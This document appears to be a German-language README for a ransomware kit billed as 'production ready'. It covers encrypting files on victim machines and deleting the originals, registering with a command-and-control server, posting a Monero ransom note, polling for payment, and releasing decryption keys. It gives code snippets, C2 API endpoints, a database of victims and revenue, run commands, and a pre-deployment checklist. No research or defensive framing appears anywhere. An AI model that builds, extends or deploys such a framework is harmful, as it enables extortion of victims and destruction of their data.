# PRODUCTION RANSOMWARE FRAMEWORK

## 📁 Verzeichnisstruktur

```
ransomware_pro/
├── production/                    ← NEUER ORDNER: Kompletter Production-Workflow
│   ├── payload.py                 ← Echter Ransomware-Payload
│   ├── c2_server.py               ← Production C2 Backend Server
│   ├── test_integration.py        ← Workflow Test
│   └── README.md                  ← Dokumentation
│
├── crypt/                         ← Encryption/Decryption Module
│   ├── encryption_engine.py       ← AES-256 Encryption
│   ├── decryption_engine.py       ← AES-256 Decryption
│   ├── encryptor.py               ← Standalone Encryption Tool
│   └── decryptor.py               ← Standalone Decryption Tool
│
└── [alte Demo-Files]              ← Bisherige Test-Scripts
```

---

## 🎯 KOMPLETTER WORKFLOW

### **PHASE 1: FILE ENCRYPTION**
```
payload.py (Victim Machine)
├─ Generate random 256-bit Master Key
├─ Scan target directories
├─ Encrypt each file with AES-256
│  └─ Format: [16-byte Salt] + [Encrypted Data]
├─ Delete original files
└─ Collect metadata (files count, total size)
```

**Code:**
```python
from crypt.encryption_engine import EncryptionEngine

engine = EncryptionEngine()
engine.encrypt_directory(target_dir, target_extensions)
master_key = engine.get_master_key_hex()
```

---

### **PHASE 2: C2 REGISTRATION**
```
payload.py → C2 Server
├─ Send ransom_id, monero_address, encryption metadata
├─ C2 receives and stores in database
└─ Master Key stored encrypted on server
```

**Request:**
```
POST /api/v1/register
{
  "ransom_id": "abc123...",
  "monero_address": "4BJV39ZuKU...",
  "ransom_amount_xmr": 0.5,
  "system_info": {
    "files_encrypted": 42,
    "data_size_gb": 1.5
  }
}
```

---

### **PHASE 3: DISPLAY RANSOM NOTE**
```
payload.py (Victim Machine)
├─ Write professional ransom note
├─ Desktop: README_ENCRYPTED.txt
├─ Display monero address & payment deadline
└─ Show encrypted file statistics
```

**Output:**
```
YOUR FILES HAVE BEEN ENCRYPTED

Ransom ID: abc123...
Amount: 0.5 XMR
Files Encrypted: 42
Total Size: 1.50 GB

Payment Deadline: 24 hours
```

---

### **PHASE 4: PAYMENT MONITORING**
```
payload.py (Victim Machine)
├─ Poll C2 every 30 seconds
├─ GET /api/v1/payment/status/{ransom_id}
├─ Check response: paid=true?
└─ If YES → Proceed to Phase 5
```

**Loop:**
```python
while True:
    time.sleep(30)
    status = http_get(f'payment/status/{ransom_id}')
    if status['paid']:
        break
```

---

### **PHASE 5: DEPLOY DECRYPTION KEY**
```
payload.py (Victim Machine)
├─ Request decryption key from C2
├─ GET /api/v1/decryption/key/{ransom_id}
├─ Receive Master Key from server
└─ Start decryption process

DecryptionEngine (Background Thread)
├─ Decrypt all .LOCKED files
├─ Restore original filenames
├─ Delete encrypted files
└─ Write success notice
```

**Code:**
```python
from crypt.decryption_engine import DecryptionEngine

decryptor = DecryptionEngine(master_key_hex)
decryptor.decrypt_directory(target_dir)
```

---

## 🚀 QUICK START

### **Terminal 1: Start C2 Server**
```bash
cd "C:\Users\Administrator\Desktop\Custom tools\ransome\ran\ransomware_pro\production"
python c2_server.py

# Output:
# [+] Listening on: http://0.0.0.0:5000
# [+] Database: production_victims.db
```

### **Terminal 2: Run Payload (Test)**
```bash
cd production

# Create test files first
mkdir C:\test_files
echo "test data" > C:\test_files\document.txt

# Run payload
python payload.py --c2-host 127.0.0.1 --c2-port 5000 --target-dirs C:\test_files

# Output:
# [PHASE 1] FILE ENCRYPTION
# [✓] Encrypted 1 files
# [PHASE 2] C2 REGISTRATION
# [✓] Registered successfully!
# [PHASE 3] DISPLAYING RANSOM NOTE
# [PHASE 4] PAYMENT MONITORING
# [Waiting for payment...]
```

### **Terminal 3: Simulate Payment**
```bash
cd "C:\Users\Administrator\Desktop\Custom tools\ransome\ran\ransomware_pro"

python complete_payment_flow.py <ransom_id> 4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV

# Output:
# [*] Step 1: Registering victim...
# [*] Step 2: Checking payment status (BEFORE payment)...
# [*] Step 3: Simulating payment...
# [*] Step 4: Verifying payment (AFTER payment)...
# [✓✓✓] PAYMENT VERIFIED!

# Terminal 2 sollte jetzt anzeigen:
# [✓✓✓] PAYMENT DETECTED!
# [PHASE 5] DEPLOYING DECRYPTION KEY
# [✓] DECRYPTION COMPLETE!
```

---

## 🔐 SECURITY DETAILS

### **Key Derivation (PBKDF2)**
```
Master Key (256-bit) + Random Salt (16-byte)
         ↓
PBKDF2(SHA256, iterations=100000)
         ↓
File Key (256-bit)
         ↓
Fernet(AES-128-CBC + HMAC-SHA256)
```

### **Encrypted File Format**
```
[Salt (16 bytes)] + [Encrypted Data (Fernet)]

Every file has unique salt:
- file1.txt.LOCKED: [Salt1] + [Data1]
- file2.txt.LOCKED: [Salt2] + [Data2]
```

### **Database Security**
```
production_victims.db
├─ ransom_id (unique ID for each victim)
├─ monero_address (payment address)
├─ master_key (stored encrypted)
├─ payment_received (boolean)
├─ status (INFECTED/PAID)
└─ metadata (files, size, hostname)
```

---

## 📊 API ENDPOINTS

### **1. Register Infection**
```
POST /api/v1/register
Content-Type: application/json

{
  "ransom_id": "abc123...",
  "monero_address": "4BJV39ZuKU...",
  "ransom_amount_xmr": 0.5,
  "system_info": {
    "files_encrypted": 42,
    "data_size_gb": 1.5,
    "hostname": "VICTIM-PC"
  }
}

Response:
{
  "success": true,
  "ransom_id": "abc123...",
  "message": "Registered successfully"
}
```

### **2. Check Payment Status**
```
GET /api/v1/payment/status/{ransom_id}

Response:
{
  "ransom_id": "abc123...",
  "paid": false,
  "status": "INFECTED",
  "amount_xmr": 0.5
}
```

### **3. Get Decryption Key**
```
GET /api/v1/decryption/key/{ransom_id}

Response (if paid):
{
  "ransom_id": "abc123...",
  "master_key": "bGJWMzk...",
  "status": "PAID"
}
```

### **4. Admin Statistics**
```
GET /api/v1/admin/stats

Response:
{
  "total_victims": 5,
  "paid_victims": 2,
  "total_revenue_xmr": 1.0
}
```

### **5. Simulate Payment (Testing)**
```
POST /api/v1/admin/pay/{ransom_id}

Response:
{
  "ransom_id": "abc123...",
  "paid": true,
  "message": "Payment simulated"
}
```

---

## 🧪 TESTING

### **Integration Test**
```bash
cd production
python test_integration.py

# Testet kompletten Workflow:
# ✓ File encryption
# ✓ C2 registration
# ✓ Payment simulation
# ✓ File decryption
# ✓ File verification
```

### **Unit Tests (Crypt Module)**
```bash
cd ..
python test_crypt.py

# Testet nur Encryption/Decryption
# ✓ Create test files
# ✓ Encrypt files
# ✓ Decrypt files
# ✓ Verify contents
```

---

## 📈 PERFORMANCE

**Encryption Speed:** ~10-50 MB/s (depends on CPU)
**Decryption Speed:** ~10-50 MB/s (same as encryption)

**File Overhead:** 
- Original: 1.0 MB
- Encrypted: 1.0 MB + 128 bytes (Fernet overhead) + 16 bytes (salt)

---

## ⚠️ IMPORTANT NOTES

1. **Master Key** - Only thing needed to decrypt all files
2. **Database** - Contains all master keys encrypted
3. **Salts** - Stored in encrypted files (16 first bytes)
4. **No backups** - Original files deleted after encryption
5. **Monero** - Only payment method (untraceable)

---

## 📋 CHECKLIST BEFORE PRODUCTION

- [ ] Test encryption/decryption workflow
- [ ] Test C2 server communication
- [ ] Test payment detection
- [ ] Verify all files encrypted properly
- [ ] Verify all files decrypted properly
- [ ] Test on isolated network
- [ ] Verify database security
- [ ] Test with multiple target directories
- [ ] Monitor C2 server logs
- [ ] Backup encryption metadata

---

## 🎓 SYSTEM ARCHITECTURE

```
ATTACKER INFRASTRUCTURE
├─ C2 Server (production/c2_server.py)
│  └─ Flask Backend on Linux/Server
│     ├─ Victim Database (SQLite)
│     ├─ Master Keys Storage
│     └─ Payment Tracking
│
VICTIM MACHINES
├─ Payload (production/payload.py)
│  ├─ Phase 1: Encryption
│  ├─ Phase 2: Registration
│  ├─ Phase 3: Ransom Note
│  ├─ Phase 4: Payment Monitor
│  └─ Phase 5: Decryption
│
SUPPORTING MODULES
└─ Crypt Engine (crypt/...)
   ├─ encryption_engine.py
   ├─ decryption_engine.py
   └─ Standalone tools
```

---

**Production Ready!** 🚀

